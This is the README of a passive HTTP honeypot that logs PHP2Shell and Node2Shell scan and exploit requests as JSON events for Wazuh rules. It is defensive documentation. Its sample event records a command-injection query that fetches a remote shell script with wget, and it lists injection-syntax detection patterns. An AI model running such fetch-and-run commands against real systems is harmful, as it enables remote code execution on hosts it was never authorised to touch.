# PHNwn2Shell - passive IoC sensor

PHNwn2Shell is a low-interaction HTTP honeypot for PHP2Shell (CVE-2026-109618 and CVE-2026-109619) and for Node2Shell and HTTP2Shell. It answers like an Apache 2.4 host with mod_php on ports 80 and 443 and like an Express host on port 3000, writes every request as one JSON line, and the Wazuh agent ships that file to the manager. The Wazuh rules for these events are in [`rules/phnwn_rules.xml`](../rules/phnwn_rules.xml).

Author: Kislley Rodrigues - Wazuh Ambassador

## What it never does

- It runs no shell and executes nothing it receives.
- It makes no outbound connection: no fetching, no enrichment, no notifiers.
- It does no decompression. Brotli bytes are only stored by sha256.
- Request bodies are capped at 32 MiB, the disk store has a quota of 2 GiB and concurrency is limited (defaults, all configurable).

A static test in the test suite bans `subprocess`, `socket`, `urllib`, `zlib`, `gzip`, `ctypes`, `pickle`, `eval`, `exec` and `compile` in the sensor code.

## Why systemd and not Docker

No container daemon is needed, the attack surface is smaller and the sandbox is declared in one file. [`phnwn2shell.service`](phnwn2shell.service) runs the sensor as an unprivileged user with only `CAP_NET_BIND_SERVICE`, `ProtectSystem=strict` with one writable directory, a syscall filter, `AF_INET` and `AF_INET6` sockets only, and memory, task and CPU limits. A unit is not a VM: a kernel bug would still reach the host, so run the sensor on a dedicated host.

## Files

| File | Purpose |
|---|---|
| `__init__.py` | Package definition and version string |
| `__main__.py` | Entry point for `python3 -m phnwn2shell` |
| `analysis.py` | Multipart statistics, tool fingerprints, IoC extraction and stage assignment |
| `server.py` | HTTP listeners (PHP and Node.js personas), event writer and data store |
| `phnwn2shell.service` | systemd unit |
| `INSTALL.md` | Installation, step by step |

Python 3 standard library only, no pip packages.

## Stages

Every request gets a `phnwn.stage` and a `phnwn.tool` label, so no event is unlabelled.

| Stage | Meaning |
|---|---|
| `survey` | A plain visit (GET or HEAD, no query, no body) to a path the page serves: `/`, `/index.php` on the PHP persona, `/favicon.ico`, `/robots.txt`, `/sitemap.xml`, `/humans.txt`, `/ads.txt`, `/.well-known/security.txt` |
| `recon` | A known scanner or client user agent, no user agent, or any path the page does not serve (`unlisted_path`, with `path_cat:*` signals such as `secrets`, `wordpress` and `api_discovery`), path traversal or a `php://` style wrapper |
| `deviation` | A page path carrying something a static page never gets: a query string, a body, another method, chunked or Brotli encoding, or injection syntax (`${`, `$(`, a backtick, `() {`, `<?`, `%{`, `{{`) in the URL, a header or the body |
| `probe`, `arm` | PHP2Shell multipart probes: the upload-progress field (`probe`), plus a session id or filename (`arm`) |
| `oom_probe` | Deep nesting, 500 or more parts, or a body of 1 MiB or more |
| `br_probe`, `br_large` | `Content-Encoding: br` (`br_probe`), and the same with a body of 1 MiB or more (`br_large`), on both personas |
| `exploit` | A command or code marker (also when glued with `$IFS`, double encoded or piped to a shell), a `/sess_` path, a serialized filename, or any URL (http, ftp, ldap, rmi, dns, gopher) in the path, query, body or in a header that itself carries code |

The `phnwn.tool` field is the scanner or client family, or `browser_ua`, `custom_ua` and `no_ua`. Headers are scanned too, and the ones that match are kept in `http.request.flagged_headers`.

## Event example

One request, one JSON line (the sensor name and fields are those written by `server.py`):

```json
{"@timestamp": "2026-10-27T16:36:42.046Z", "event": {"kind": "alert", "module": "phnwn2shell", "dataset": "phnwn2shell.events", "action": "http_request"}, "observer": {"name": "phnwn2shell-01", "type": "honeypot", "version": "0.1.0"}, "srcip": "127.0.0.1", "url": {"path": "/index.php", "query": "cmd=wget%20http://203.0.113.9/x.sh"}, "phnwn": {"persona": "php", "listener_port": 18080, "tls": false, "stage": "exploit", "tool": "curl", "signals": "ua_curl"}, "ioc": {"url_count": 1, "urls_csv": "http://203.0.113.9/x.sh", "code_marker": true}}
```

The example is shortened to the fields the rules use. The native Wazuh JSON decoder flattens the nested objects into dotted field names such as `phnwn.stage` and `ioc.url_count`.

## Wazuh rules

The rules in `rules/phnwn_rules.xml` select one value of `phnwn.stage` each:

| Rule | Stage or condition | Level |
|---|---|---|
| 100220 | Any request logged by the sensor (base rule) | 5 |
| 100221 | `recon` | 6 |
| 100222 | `probe` or `arm` | 8 |
| 100223 | `oom_probe` | 10 |
| 100224 | `br_probe` | 10 |
| 100225 | `br_large` | 12 |
| 100226 | `exploit` | 12 |
| 100227 | `exploit` with at least one URL in the payload (`ioc.urls_csv`) | 13 |

Benign URLs, such as documentation domains and XML namespaces, appear in `ioc.urls_csv`, so filter them before you treat an alert as an indicator of compromise. A single alert is an observation of what a scanner sent to a decoy. It does not mean that any real system was compromised.

## Install

See [`INSTALL.md`](INSTALL.md).

## Tests

The sensor was tested with 49 unit tests (parser, stages, client labels, IoC extraction, chunked bodies, size cap, quota, TLS with a self-signed certificate, "nothing executed", static safety). A live request produces the event shown above.

## Limitations

- `exploit` and the `path_cat` labels are signature based, so a new payload is recorded as `deviation` or `recon` until a pattern for it exists. Obfuscation beyond three rounds of percent-encoding is not decoded.
- The fingerprints come from public sources and code reading. Real PHP2Shell exploitation tooling was not used against the sensor.
- It is a decoy with fixed answers. It does not emulate a vulnerable application, so it records what a scanner sends but not what a successful exploit would do next.
